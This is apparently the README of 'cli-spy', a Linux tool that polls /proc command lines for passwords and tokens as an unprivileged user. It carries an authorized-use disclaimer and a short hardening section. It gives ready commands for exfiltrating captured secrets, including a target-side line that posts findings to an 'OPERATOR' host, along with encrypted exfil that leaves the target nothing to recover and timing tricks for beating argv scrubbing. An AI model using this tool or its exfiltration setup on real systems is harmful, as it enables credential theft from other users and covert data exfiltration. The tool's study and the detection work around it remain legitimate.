# cli-spy

Unprivileged, passive Linux monitor that watches `/proc/*/cmdline` (and optionally
`environ`) for credentials and tokens exposed as command-line arguments. 

Single static C binary, zero runtime dependencies, no root required.

> **Authorized use only.** cli-spy is a detection-engineering and security-research
> tool. Run it only on systems you own or are explicitly authorized to test. Its
> purpose is to *demonstrate and measure* a known OS-level exposure so you can
> build detections and harden against it, not to harvest credentials you have no
> right to. 

## Why this exists

Passing secrets on the command line (`mysql -p<pass>`, `curl -u user:pass`,
`--token=...`) is world-readable: any local user can read any process's argv via
`/proc/<pid>/cmdline` (mode 0444). The usual alternative, environment variables,
are *not* world-readable (`/proc/<pid>/environ` is 0400) which is exactly why
"just use env vars" is the standard advice. cli-spy demonstrates the exposure by silently 
capturing argv secrets as an unprivileged user, and optionally exfiltrating them. 
This can be useful in CTFs or authorized engagements when LPE is seemingly exhausted but a 
lazy script or careless root user broadcasts something you can pivot with on their command line.  
Inspired by pspy, but built to be more lightweight.

## Features

- **Unprivileged**: runs as any user; no root, no capabilities, no ptrace.
- **Zero dependencies**: static musl binary (~100 KB), runs on any modern Linux
  (Debian, Ubuntu, Fedora, Arch, …) regardless of installed libraries.
- **26 detection rules**: binary-scoped CLIs (mysql, sshpass, docker, redis-cli,
  smbclient, vault, az, aws, htpasswd, mosquitto, k6, openssl, twine, curl) plus
  token-format rules (AWS, GitHub, GitLab, Slack, Stripe, Twilio, OpenAI, Google,
  Vault HVS, JWT) plus a generic `--password/--token/--api-key` catch-all and a
  Shannon-entropy fallback.
- **Confidence scoring**: every finding carries a 0–100 confidence.
- **Grace-window rescanning**: new PIDs are rescanned for their first few sweeps,
  dramatically improving capture of short-lived and argv-scrubbing processes.
- **Sealed-box exfil**: optional TweetNaCl `crypto_box_seal` encryption. all-in-one, audited library - pretty cool. 
  The target only ever holds the operator's *public* key; findings are encrypted
  in memory before leaving the process, so captures are opaque on the wire and
  unrecoverable from the binary. Diskless (`-u` without `-o` writes nothing).
- **Self-test**: `-t` runs the engine against known-bad argv strings. 

## Build

```sh
make                    # dynamic dev build
make static             # portable static binary (musl)
python3 tools/keygen.py # generate operator keypair -> cli-spy.pk / cli-spy.sk (you can do this yourself, script included for convenience) 
make operator-static    # static build with cli-spy.pk compiled in (no key file on target)
```
## Usage
```
cli-spy [options]
  -i MS    poll interval in milliseconds (default 10)
  -o FILE  append findings as JSONL to FILE (default stdout)
  -u URL   POST each finding to http://host[:port]/path
  -k FILE  operator public key (64 hex chars) for sealed exfil
  -e       also scan /proc/PID/environ where readable (same-UID only)
  -r       redact secrets in output (demo mode)
  -1       single sweep, then exit
  -t       self-test the detection engine and exit
  -v       verbose
```
## Example setup:

operator side (your exfil server):
```
python3 tools/cli-spy-receive.py cli-spy.sk 8080
```
target side:
```
./cli-spy -u http://OPERATOR:8080/ingest -v
```

## Example finding
```
{"ts":"2026-08-16T20:00:54.274Z","pid":5251,"uid":0,"user":"root",
 "rule":"mysql-inline-password","confidence":95,"secret":"Hunter2!",
 "cmdline":"mysql -u root -pHunter2! -h 127.0.0.1 -e select 1"}
```


Some binaries defend themselves by overwriting the secret in their own argv microseconds after reading it (sshpass blanks it; mysql/mariadb fills with x). cli-spy's grace-window rescanning races that scrub:
Tool    Pre-scrub window        Catch rate @ 10 ms
mysql / mariadb -p      ~2–5 ms ~80%
sshpass -p      microseconds    ~5%

cli-spy also filters the 1-char scrub residue (mysql -px → x) so missed scrubs don't produce false-positive noise.


## Exfil security model
Exfiltration encrypts the payload, not the pipe. Each finding is sealed to a fresh ephemeral keypair against the operator's baked-in public key (X25519 + XSalsa20-Poly1305 via TweetNaCl). 

Implications:
The private key never exists on the target. 
Recovering the binary yields only the public key; past captures stay sealed.
Wire captures show only opaque blobs (Wire format per blob: ephemeral_pk[32] | nonce[24] | mac[16]+ciphertext)
No TLS stack, no library dependencies: payloads go over HTTP as encrypted blobs, for better or worse. 
feel free to fork this and make a TLS version or submit a PR! 


## Limitations
Polling misses very short-lived processes. Sub-~2 ms processes are probabilistic at 10 ms. Event-driven capture (eBPF on execve) would fix this but requires root which defeats the tool's purpose.
argv scrubbing by well-behaved binaries (sshpass, mysql) shrinks the window to microseconds; you _can_ catch credentials here 
but there is a massive luck factor, even with 10ms polling. 
Sophisticated administrators will be well-aware of this vector and enable hidepid=2 on /proc which blinds unprivileged polling entirely.  
-e env scanning only reads processes owned by the same UID (environ is 0400); it can't read other users' environments without root. 

## Detection / hardening against this type of tool:
Mount /proc with hidepid=2 to deny unprivileged argv visibility.
Prefer config files with 0600 perms, env vars, or --password-file-style flags over inline argv secrets.


